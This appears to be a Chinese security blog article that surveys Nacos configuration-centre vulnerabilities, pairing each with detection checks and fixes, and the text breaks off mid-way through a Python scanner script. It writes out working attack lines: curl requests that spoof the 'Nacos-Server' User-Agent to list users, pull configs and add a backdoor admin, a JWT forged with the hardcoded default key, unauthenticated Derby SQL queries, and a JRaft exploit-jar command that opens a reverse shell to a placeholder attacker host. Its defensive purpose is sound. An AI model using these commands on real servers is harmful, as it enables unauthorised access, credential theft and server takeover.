---
title: Nacos 漏洞大起底：你的微服务可能正在\"裸奔\"！
url: https://mp.weixin.qq.com/s/FlHyynSyUwdpVZMIxQiB-A
source: Doonsec's feed
date: 2026-04-08
fetch_date: 2026-04-09T04:29:31.382207
---

# Nacos 漏洞大起底：你的微服务可能正在\"裸奔\"！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dMqqFicgqDGBC4iapuetYvZ8C4JdDmpCv6QjgyG2kJ7rO5vF0pKJeDYZOp2BbdfBrSRT8kkcohzHQJTRKiatQQDqIoy5JTO1aXex1qxkmBZ50E/0?wx_fmt=jpeg)

# Nacos 漏洞大起底：你的微服务可能正在"裸奔"！

原创

simeon的文章
simeon的文章

小兵搞安全

![]()

在小说阅读器中沉浸阅读

国内超 50% 云原生项目都在用，但 90% 的运维人员不知道这些致命漏洞

## 开篇：一个真实的警告

2026 年 3 月，某大型互联网公司的安全团队在例行扫描中发现了一个令人脊背发凉的事实：**他们核心业务系统的 Nacos 配置中心，正通过一个 5 年前的漏洞向全网暴露敏感配置。**

数据库密码、API 密钥、内网拓扑……所有机密信息，只需一条 curl 命令即可获取。

这不是个例。根据最新统计，**互联网上仍有超过 2 万台 Nacos 实例存在未授权访问风险**，其中不乏金融、政务等关键基础设施。

今天，我们就来彻底梳理 Nacos 的那些"要命"漏洞，帮你把微服务架构的安全防线真正筑牢。

![](https://mmbiz.qpic.cn/mmbiz_png/dMqqFicgqDGCnr3YpCuotaP2NLd1bPojRHu0DHJelnfsE46eryftbWdib9XibFgCnBbfocVVSbaicSvytz9bFM5jtLGmSt8UQvr7icqMewW7GCjE/640?wx_fmt=png)

## 一、漏洞全景图：五大类致命风险

Nacos 作为国内市场份额超 50% 的云原生核心组件，其安全漏洞主要可分为以下五类：

|  |  |  |  |
| --- | --- | --- | --- |
| **漏洞类型** | **危害等级** | **代表漏洞** | **核心风险** |
| 🚨 认证与授权类 | 严重 | CVE-2021-29441、默认 JWT 密钥 | 未授权访问、数据泄露 |
| 💣 反序列化 RCE 类 | 严重 | CNVD-2023-45001 | 远程代码执行、服务器接管 |
| 🗄️ 注入类 | 高危 | Derby SQL 注入 | 数据泄露、间接 RCE |
| 🧩 依赖组件类 | 高危 | Tomcat CVE-2025-49125 | 会话劫持、中间人攻击 |
| ⚠️ 其他 | 中危 | XSS、信息泄露 | 权限提升、信息收集 |

**划重点**：前两类漏洞一旦被利用，攻击者可直接接管你的服务器。

## 🔓 二、认证绕过类：最容易被忽视的"后门"

### 2.1 CVE-2021-29441：User-Agent 鉴权绕过

**漏洞评分：9.8/10（严重）**

这是 Nacos 历史上最著名的漏洞之一。简单来说，**只要你在请求头里加上**`User-Agent: Nacos-Server`**，就能绕过所有认证检查。**

#### 为什么会有这种"后门"？

早期 Nacos 集群节点间通信需要跳过鉴权，开发人员图方便，直接用 User-Agent 字段判断"是否为集群内部请求"，却忘了攻击者也能伪造这个字段。

#### 攻击者可以做什么？

```
# 获取所有用户列表
 curl -H "User-Agent: Nacos-Server" http://target:8848/nacos/v1/auth/users

 # 下载敏感配置
 curl -H "User-Agent: Nacos-Server" "http://target:8848/nacos/v1/cs/configs?dataId=mysql-config"

 # 添加后门账号
 curl -X POST -H "User-Agent: Nacos-Server" \
   -d "username=hacker&password=hacker123" \
   "http://target:8848/nacos/v1/auth/users"
```

**只需 3 条命令，攻击者就能在你的系统里创建管理员账号。**

#### 如何检测？

```
curl -s -H "User-Agent: Nacos-Server" \
   http://your-nacos:8848/nacos/v1/auth/users | grep "pageItems"
```

如果返回包含 `pageItems`，说明你的系统**正在裸奔**。

#### 修复方案

1. **立即升级**：Nacos 1.4.1 及以上版本
2. **配置加固**：

```
nacos.core.auth.enabled=true
 nacos.core.auth.enable.userAgentAuthWhite=false
```

### 2.2 默认 JWT 密钥漏洞

**漏洞评分：9.6/10（严重）****影响版本：0.1.0 ~ 2.2.0**

这个漏洞更隐蔽，也更危险。Nacos 2.2.0 之前版本使用了一个**硬编码的 JWT 签名密钥**：

 SecretKey012345678901234567890123456789012345678901234567890123456789

这个密钥是公开的，意味着**任何人都能伪造任意用户的登录令牌**。

#### 利用演示

```
import jwt
 import time

 DEFAULT_KEY = "SecretKey012345678901234567890123456789012345678901234567890123456789"

 payload = {
     "sub": "nacos",
     "exp": int(time.time()) + 3600 * 24 * 365  # 一年后过期
 }
 token = jwt.encode(payload, DEFAULT_KEY, algorithm="HS256")
```

拿到这个 token，你就可以以管理员身份访问 Nacos 控制台，**无需知道任何密码**。

#### 修复方案

```
# 修改为 32 位以上随机强密钥
 nacos.core.auth.plugin.nacos.token.secret.key=YourCustomSecretKeyWith32CharsOrMore123456789
```

⚠️**集群环境需同步所有节点配置**，否则会导致集群通信失败。

### 2.3 serverIdentity 权限绕过

**影响版本：1.4.1 ~ 1.4.5，2.0.0 ~ 2.2.0.1**

这是 User-Agent 绕过的"继承者"。Nacos 改用 `serverIdentity` 请求头进行集群认证，但**默认值依然是公开的**：

```
nacos.core.auth.server.identity.key=serverIdentity
 nacos.core.auth.server.identity.value=security
```

#### 利用方式

 curl -H "serverIdentity: security" http://target:8848/nacos/v1/auth/users

#### 修复方案

```
# 修改为自定义值
nacos.core.auth.server.identity.key=custom-key-xxx
nacos.core.auth.server.identity.value=custom-value-xxx
```

## 💣 三、反序列化 RCE：远程代码执行的噩梦

### CNVD-2023-45001：JRaft Hessian 反序列化漏洞

**漏洞评分：9.8/10（严重）****影响版本：集群模式 1.4.0~1.4.6，所有模式 2.0.0~2.2.3**

这是 Nacos 最危险的漏洞之一。攻击者可通过**7848 端口**发送恶意序列化数据，直接在目标服务器上执行任意命令。

#### 为什么危险？

* ✅ 无需认证
* ✅ 无需登录
* ✅ 直接获得服务器权限
* ✅ 可植入内存马，难以检测

#### 利用条件

1. 7848 端口对外可访问
2. JDK 8 环境（主流部署环境）

#### 攻击演示

```
java -jar nacos-jraft-rce-exp.jar target:7848 \
  "bash -i >& /dev/tcp/attacker-ip/port 0>&1"
```

一条命令，攻击者就能获得你的服务器 shell 权限。

#### 检测方法

```
import socket

def check_jraft_port(target, port=7848):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target, port))
        s.send(b"\x00\x00\x00\x01")
        resp = s.recv(1024)
        s.close()
        if resp:
            print(f"[!] {target}:{port} JRaft 端口开放，可能存在漏洞")
            return True
    except:
        pass
    return False
```

#### 修复方案

* **升级版本**：Nacos 2.2.3 及以上
* **端口限制**：

```
# 7848 端口仅允许集群内部访问
iptables -A INPUT -p tcp --dport 7848 -s <内网网段> -j ACCEPT
iptables -A INPUT -p tcp --dport 7848 -j DROP
```

* **网络隔离**：禁止 7848 端口对外开放

## 🗄️ 四、注入类漏洞：数据库的"任意门"

### Derby SQL 注入（CNVD-2020-67618）

**漏洞评分：8.5/10（高危）****影响版本：Nacos ≤ 1.4.0**

Nacos 早期版本默认内置 Derby 数据库，`/nacos/v1/cs/ops/derby` 接口**未做认证校验**，攻击者可执行任意 SQL 语句。

#### 利用演示

```
# 获取用户表信息
curl "http://target:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users"

# 获取配置信息（含敏感数据）
curl "http://target:8848/nacos/v1/cs/ops/derby?sql=select%20tenant_id,data_id,content%20from%20config_info"
```

#### 进阶利用：Derby RCE（CVE-2021-29442）

通过 Derby 的 `CALL sqlj.install_jar` 功能，攻击者可加载恶意 jar 包，实现远程代码执行。

python3 CVE-2021-29442.py -t http://target:8848 -c "id"

#### 修复方案

* 升级至 Nacos 1.4.1 及以上
* 生产环境使用 MySQL/PostgreSQL 替代 Derby
* 配置网络白名单

## 🧩 五、依赖组件漏洞：被忽视的"连环雷"

Nacos 3.0.2 及以下版本存在多个依赖组件漏洞：

|  |  |  |  |
| --- | --- | --- | --- |
| **组件** | **CVE 编号** | **危害** | **修复方案** |
| Tomcat | CVE-2025-49125 | 认证绕过 | 升级 Tomcat 至 10.1.42+ |
| HttpClient5 | CVE-2025-27820 | 中间人攻击 | 升级 HttpClient5 至 5.4.3+ |
| Spring Boot | CVE-2025-22228 | 依赖漏洞 | 升级 Nacos 至 2.5.2 或 3.x |
| axios | CVE-2023-45857 | CSRF | 升级 Nacos 或手动更新前端依赖 |

**建议**：直接使用 Nacos 官方发布的最新修复版本，避免手动升级依赖带来的兼容性问题。

## ⚠️ 六、其他高风险漏洞

### 6.1 未授权配置下载

**影响版本：1.2.0 ~ 1.4.1**

Nacos 的配置导出接口 `/nacos/v1/cs/configs/export` 未做鉴权，攻击者可**一键下载所有配置**。

curl "http://target:8848/nacos/v1/cs/configs/export?dataId=&group=&tenant=" -o configs.zip

这个 zip 包里，可能包含你的数据库密码、API 密钥、第三方服务凭证……

**修复**：升级至 Nacos 1.4.2 及以上。

### 6.2 默认账号密码

**影响版本：全版本（0.x ~ 3.x）**

* 默认账号密码：`nacos/nacos`
* 1.4.0 及以下版本默认**关闭认证**

很多企业部署后从未修改默认密码，这相当于把大门钥匙挂在门把手上。

#### 检测

```
curl -X POST "http://target:8848/nacos/v1/auth/users/login" \
  -d "username=nacos&password=nacos"
```

#### 修复

* 修改默认账号密码
* 启用认证：`nacos.core.auth.enabled=true`
* 配置 IP 白名单

### 6.3 Namespaces 未授权访问

**影响版本：1.x ~ 2.x**

`/nacos/v1/console/namespaces` 接口可获取命名空间列表，攻击者可借此**收集内网拓扑信息**。

curl http://target:8848/nacos/v1/console/namespaces

**修复**：升级至 Nacos 3.x 版本。

## 🔍 七、如何检测你的 Nacos 是否安全？

### 7.1 快速检测脚本

```
#!/usr/bin/env python3
import requests
import jwt
import time
import socket

class NacosScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.vulns = []

    def check_all(self):
        self.check_unauth()
        self.check_cve_2021_29441()
        self.check_default_jwt_key()
        self.check_derby_sqli()
        self.check_jraft_port()
        self.print_results()

    def check_unauth(self):
        resp = requests.get(f"{self.target}/nacos/v1/auth/users", timeout=5)
        if resp.status_code == 200 and "pageItems" in resp.text:
            self.vulns.append("❌ 未授权访问漏洞")

    def check_cve_2021_29441(self):
        headers = {"User-Agent": "Nacos-Server"}
        resp = requests.get(f"{self.target}/nacos/v1/auth/users", headers=headers, timeout=5)
        if resp.status_code == 200 and "pageItems" in resp.text:
            self.vulns.append("❌ CVE-2021-29441 User-Agent 绕过")

    def check_default_jwt_key(self):
        key = "SecretKey012345678901234567890123456789012345678901234567890123456789"
        payload = {"sub": "nacos", "exp": int(time.time()) + 3600}
        token = jwt.encode(payload, key, algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.get(f"{self.target}/nacos/v1/auth/users", headers=headers, timeout=5)
        if resp.status_code == 200:
            self.vulns.append("❌ 默认 JWT 密钥漏洞")

    def check_derby_sqli(self):
        resp = requests.get(f"{self.target}/nacos/v1/cs/ops/derby?sql=select%201", timeout=5)
        if resp.status_code == 200:
            self.vulns.append("❌ Derby SQL 注入漏洞")

    def chec...